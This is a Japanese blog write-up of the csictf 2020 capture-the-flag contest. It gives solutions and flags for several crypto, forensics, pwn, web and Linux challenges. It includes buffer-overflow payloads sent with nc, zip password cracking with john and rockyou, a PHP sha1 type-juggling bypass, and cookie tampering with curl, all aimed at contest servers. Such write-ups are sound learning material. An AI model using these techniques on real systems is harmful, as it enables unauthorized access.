---
title: "csictf 2020 Writeup"
date: 2020-07-22T13:00:00+09:00
lastmod: 2020-07-22T13:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fcsi_ctf_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://ctf.csivit.com/challenges](https://ctf.csivit.com/challenges)

<br />
最終順位は、319位でした。

<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score0.png" alt="csictf_2020_Score0.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score1.png" alt="csictf_2020_Score1.png">

<br />

日曜日にだけやったので、その後に追加された分は見れてません。

以下、Discordにあった情報ですが、58個もチャレンジがあったみたいです。現時点で、すでにチャレンジ一覧は見れません。。

<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Discord.png" alt="csictf_2020_Discord.png">




<br /><br />
## [Crypto]: Rivest Shamir Adleman
- - -
### Challenge
> These 3 guys encrypted my flag, but they didn't tell me how to decrypt it.

Attachment:

- enc.txt

<br />
### Solution
RsaCtfTool.pyで解けるRSAの問題でした。NをFactorizeしてから実行しました。

<br />

Flag: `csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}`




<br /><br />
<br /><br />
## [forensics]: Gradient sky
- - -
### Challenge
> Gradient sky is a begginer level ctf challenge which is aimed towards rookies.
<br />

Attachment:

- sky.jpg

<br />
### Solution
stringsコマンドで解ける問題でした。

<br />

Flag: `csictf{j0ker_w4snt_happy}`



<br /><br />
<br /><br />
## [Forensics]: Archenemy
- - -
### Challenge
> John likes Arch Linux. What is he hiding?
<br />

Attachment:

- arched.png

<br />
### Solution
$ foremost

$ steghide extract -sf 00000000.jpg

$ zip2john flag.zip > hash.txt

$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

<br />

Flag: `csictf{1_h0pe_y0u_don't_s33_m3_here}`


<br /><br />
<br /><br />
## [Forensics]: Panda
- - -
### Challenge
> I wanted to send this file to AJ1479 but I did not want anyone else to see what's inside it, so I protected it with a pin.

Attachment:

- panda.zip


<br />
### Solution
$ zip2johnとjohnを使ってzipを解凍すると（パスワード: 2611）、２つのjpgファイルが出てきます。

サイズが全く同じであるため、バイナリの比較を取ってみたところ、フラグが見つかりました。
<pre>
$ ls -al
-rw-r--r--  1 captureamerica captureamerica  78034 Jul  6 03:58 panda1.jpg
-rw-r--r--  1 captureamerica captureamerica  78034 Jul  6 03:57 panda.jpg

$ cmp -bl panda.jpg panda1.jpg 
  265  63 3    143 c
  266 142 b    163 s
  267 162 r    151 i
 7844 123 S    143 c
 7845 333 M-[  164 t
 7846 314 M-L  146 f
 7847 103 C    173 {
22173 315 M-M  153 k
22174 362 M-r  165 u
22175 301 M-A  156 n
25751  27 ^W   147 g
25752 150 h    137 _
42013 147 g    146 f
42014 355 M-m  165 u
42015 152 j    137 _
46084 151 i    160 p
46085  44 $     64 4
46086 142 b    156 n
46087 111 I    144 d
46088 354 M-l   64 4
46089 331 M-Y  175 }

$ cmp -bl panda.jpg panda1.jpg | rev | cut -c 1 | tr -d "\n" ; echo
csictf{kung_fu_p4nd4}
</pre>

<br />

Flag: `csictf{kung_fu_p4nd4}`



<br /><br />
<br /><br />
## [Pwn]: pwn intended 0x1
- - -
### Challenge
> I really want to have some coffee!
<br /><br />
nc chall.csivit.com 30001

Attachment:

- pwn-intended-0x1

<br />
### Solution
<pre>
$ (python -c 'print("A"*48)' ; cat - ) | nc chall.csivit.com 30001
Please pour me some coffee:

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
</pre>

<br />

Flag: `csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}`



<br /><br />
<br /><br />
## [Pwn]: pwn intended 0x2
- - -
### Challenge
> Travelling through spacetime!
<br /><br />
nc chall.csivit.com 30007

Attachment:

- pwn-intended-0x2

<br />
### Solution
<pre>
$ (python -c 'print("A"*44)+"\xbe\xba\xfe\xca\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30007
Welcome to csictf! Where are you headed?
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}
</pre>

<br />

Flag: `csictf{c4n_y0u_re4lly_telep0rt?}`



<br /><br />
<br /><br />
## [Pwn]: pwn intended 0x3
- - -
### Challenge
> Teleportation is not possible, or is it?
<br /><br />
nc chall.csivit.com 30013

Attachment:

- pwn-intended-0x3

<br />
### Solution
<pre>
$ (python -c 'print("A"*40)+"\xce\x11\x40\x00\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30013
Welcome to csictf! Time to teleport again.
Well, that was quick. Here's your flag:
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
</pre>

<br />

Flag: `csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}`




<br /><br />
<br /><br />
## [Web]: Cascade
- - -
### Challenge
> Welcome to csictf.
<br /><br />
[http://chall.csivit.com:30203](http://chall.csivit.com:30203)

<br />
### Solution
style.cssの中にフラグが入っていました。

<br />

Flag: `csictf{w3lc0me_t0_csictf}`



<br /><br />
<br /><br />
## [Web]: Warm Up
- - -
### Challenge
> If you know, you know; otherwise you might waste a lot of time.
<br /><br />
[http://chall.csivit.com:30272](http://chall.csivit.com:30272)

<br />
### Solution
上記にアクセスすると、以下のコードが表示されます。

```php
<?php

if (isset($_GET['hash'])) {
    if ($_GET['hash'] === "10932435112") {
        die('Not so easy mate.');
    }

    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print "csictf{loser}";
    }
} else {
    show_source(__FILE__);
}

?>
```

<br />
Hashコリジョン系のチャレンジのようです。10932435112とか、0e07766915004133176347055865026311692244（10932435112のsha1）でひらすらググると、以下の情報が見つかりました。

<pre>
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
</pre>


<br />

以下のURLでアクセスするとフラグがもらえました。

[http://chall.csivit.com:30272/?hash=aaroZmOk](http://chall.csivit.com:30272/?hash=aaroZmOk)


<br />

Flag: `csictf{typ3_juggl1ng_1n_php}`



<br /><br />
<br /><br />
## [Web]: Mr Rami
- - -
### Challenge
> "People who get violent get that way because they can’t communicate."
<br /><br />
[http://chall.csivit.com:30231](http://chall.csivit.com:30231)

<br />
### Solution
robots.txtを参照して、[http://chall.csivit.com:30231/fade/to/black](http://chall.csivit.com:30231/fade/to/black) にアクセスするだけです。

<br />

Flag: `csictf{br0b0t_1s_pr3tty_c00l_1_th1nk}`




<br /><br />
<br /><br />
## [Linux]: AKA
- - -
### Challenge
> Cows are following me everywhere I go. Help, I'm trapped!
<br /><br />
nc chall.csivit.com 30611

<br />
### Solution
どうやら禁止されているコマンドを実行するとcowsayが走る、みたいなやつです。以下にあるように、xxdなんかは、cowsayが走りませんでした。

<pre>
$ nc chall.csivit.com 30611
user @ csictf: $ 
cat flag.txt
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo. flag.txt                          /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

user @ csictf: $ 
xxd flag.txt
user @ csictf: $ 
find .
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo. .                                 /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

</pre>

<br />
tacコマンドで取れました。

<pre>
user @ csictf: $ 
tac flag.txt
csictf{1_4m_cl4rk3_k3nt}
</pre>


<br />

Flag: `csictf{1_4m_cl4rk3_k3nt}`



<br /><br />
<br /><br />
## [Linux]: find32
- - -
### Challenge
> I should have really named my files better. I thought I've hidden the flag, now I can't find it myself. (Wrap your flag in csictf{})
<br /><br />
ssh user1@chall.csivit.com -p 30630 (Password is find32)

<br />
### Solution
ls -alでファイルの一覧を見ると、ひとつだけサイズの異なるものが見つかります。

{{< highlight java "linenos=table,hl_lines=11" >}}
$ ls -al
total 4816
drwxr-x--- 1 root user1 12288 Jul 17 23:09 .
drwxr-xr-x 1 root root   4096 Jul 19 03:50 ..
-rwxr-x--- 1 root user1 10000 Jul 17 23:08 02KG7GI3
-rwxr-x--- 1 root user1 10000 Jul 17 23:08 02M95EZJ
:
(snip)
:
-rwxr-x--- 1 root user1 10000 Jul 17 23:08 MIN0CJNB
-rwxr-x--- 1 root user1 10058 Jul 17 23:08 MITS1KT3
-rwxr-x--- 1 root user1 10000 Jul 17 23:08 MLNCZNJH
:

{{< / highlight >}}

<br />


MITS1KT3の中身を確認すると、`csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}` というのが見つかります。

user2にsuして、ホームにあるファイルをチェックします。

<pre>
$ su user2
Password: 

user2@find32-55bc4b84d5-9gcbl:/user1$ whoami
user2

user2@find32-55bc4b84d5-9gcbl:/user1$ ls -al
ls: cannot open directory '.': Permission denied

user2@find32-55bc4b84d5-9gcbl:/user1$ cd

user2@find32-55bc4b84d5-9gcbl:~$ pwd
/user2

user2@find32-55bc4b84d5-9gcbl:~$ ls -al
total 3708
drwxr-x--- 1 root user2   4096 Jul 17 23:09 .
drwxr-xr-x 1 root root    4096 Jul 19 03:50 ..
-rwxr-x--- 1 root user2 756782 Jul 17 23:08 adgsfdgasf.d
-rwxr-x--- 1 root user2 756782 Jul 17 23:08 fadf.x
-rwxr-x--- 1 root user2 756782 Jul 17 23:08 janfjdkn.txt
-rwxr-x--- 1 root user2 756782 Jul 17 23:08 notflag.txt
-rwxr-x--- 1 root user2 756798 Jul 17 23:08 sadsas.tx

</pre>

<br />

ここで、sadsas.tx だけ少しサイズが大きいので、このファイルにフラグが入っていると予想。

<pre>
user2@find32-55bc4b84d5-9gcbl:~$ diff adgsfdgasf.d sadsas.tx 
42391a42392
> th15_15_unu5u41

</pre>

<br />

Flag: `csictf{th15_15_unu5u41}`



<br /><br />
<br /><br />
## [Web]: Oreo
- - -
### Challenge
> My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.
<br /><br />
http://chall.csivit.com:30243

<br />
### (Unsolved)
かなりの数の人が解けていたにも関わらず、自分が解けなかった問題。。。

やることと言えば、flavour=Y2hvY29sYXRlCg%3D%3D ("strawberry") でセットされたCookieの値を Y2hvY29sYXRl ("chocolate") に変えてアクセスするだけなんですけど、解けなかった原因は以下です。

<pre>
$ echo chocolate | base64
Y2hvY29sYXRlCg==
</pre>

<br />
echoだと改行が入っちゃうので、printfとかでやるのが正解でした。

<pre>
$ printf chocolate | base64
Y2hvY29sYXRl
</pre>


<br />
というか、echo -nでもできました。

<pre>
$ echo -n chocolate | base64
Y2hvY29sYXRl
</pre>




<br />
考えてみたら、そうだよなぁ。（1年間CTFやってきて、今頃こんなのにハマるとは。。）

<br />
まだサーバ生きていたので、やってみました。

<pre>
$ curl http://chall.csivit.com:30243/ --cookie "flavour=Y2hvY29sYXRl" ; echo
csictf{1ick_twi5t_dunk}
</pre>


<br />

Flag: `csictf{1ick_twi5t_dunk}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
